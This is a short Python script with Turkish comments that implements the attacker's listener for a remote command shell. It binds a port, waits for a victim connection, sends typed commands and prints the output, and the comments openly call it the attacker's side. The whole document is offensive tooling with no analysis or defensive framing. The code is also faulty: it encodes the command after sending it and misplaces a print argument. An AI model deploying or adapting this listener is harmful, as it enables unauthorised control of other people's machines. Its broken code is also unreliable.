import socket #Socket oluşturmak için kullandığımız modül
port=6161 #Saldırganın dinleyeceği port adresi
ip="127.0.0.1" #Saldırgan'ın dış dünya ile bağlantısını sağlayan IP adresi
def baglanti():
   Socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Socket.bind((ip,port))
   Socket.listen(1)
   socketaddr,ipaddr= Socket.accept()
   print('Baglanti gerceklesti'),ipaddr

   while True:
       komut= input("Shell> ")
       if 'cikis' in komut:
           socketaddr.send('cikis')
           socketaddr.close()
           break
       else:
           socketaddr.send(komut).encode()
           print(socketaddr.recv(1024))
baglanti()